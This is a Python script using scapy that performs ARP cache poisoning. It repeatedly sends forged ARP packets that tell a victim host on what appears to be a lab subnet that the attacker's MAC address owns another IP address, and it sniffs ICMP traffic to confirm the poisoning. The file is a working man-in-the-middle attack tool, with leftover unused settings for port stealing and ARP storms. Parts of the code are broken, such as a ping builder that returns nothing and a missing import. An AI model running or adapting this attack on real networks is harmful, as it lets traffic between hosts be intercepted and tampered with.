from scapy.all import *
import time

import threading
lock = threading.Lock()

ARP_STORM_DELAY = 10          # milliseconds
ARP_POISON_SMART = 0          # boolean
ARP_POISON_WARM_UP = 1        # seconds
ARP_POISON_DELAY = 10         # seconds
ARP_POISON_ICMP = 1           # boolean
ARP_POISON_REPLY = 1          # boolean
ARP_POISON_REQUEST = 0        # boolean
ARP_POISON_EQUAL_MAC = 1      # boolean
DHCP_LEASE_TIME = 1800        # seconds
PORT_STEAL_DELAY = 10         # seconds
PORT_STEAL_SEND_DELAY = 2000  # microseconds

ATTACKER_MAC = get_if_hwaddr(conf.iface)
ATTACKER_IP = get_if_addr(conf.iface)

poison_thread: threading.Thread = 0
poison_confirm_thread: threading.Thread = 0



macVictim = "08:00:27:b7:c4:af"
ipVictim = "192.168.56.101"

ipToSpoof = "192.168.56.102"

arp = Ether() / ARP()
arp[Ether].src = ATTACKER_MAC
arp[ARP].hwsrc = ATTACKER_MAC
arp[ARP].psrc = ipToSpoof
arp[ARP].hwdst = macVictim
arp[ARP].pdst = ipVictim

# sendp(arp, iface="enp0s3")

def build_ether(_mac_attacker):
    ether = Ether()
    ether.src = _mac_attacker
    ether.dst = macVictim
    return ether

def build_icmp_echo():
    icmp = ICMP()
    return icmp

def forge_l2_ping():
    ping = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()

def arp_poison():
 while True:
    with lock:
        print("[*] Sending ARP poison packets...")
        sendp(arp) # iface="enp0s3"
        print()

    time.sleep(ARP_POISON_WARM_UP)
        

def poison_confirm():
    while True:
        pkt = sniff(filter="icmp", count=1)
        with lock:
            print("[*] Received ARP packet:")
            pkt.show()
            print()


def main():
    #use daemon=True to run in background and stop when application quits
    poison_thread =  threading.Thread(target=arp_poison, daemon=True).start()
    poison_confirm_thread = threading.Thread(target=poison_confirm, daemon=True).start()

    # wait for ctrl+c to exit application
    try: 
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        sys.exit(0)

if __name__ == "__main__":
    main()
    print("Done")
    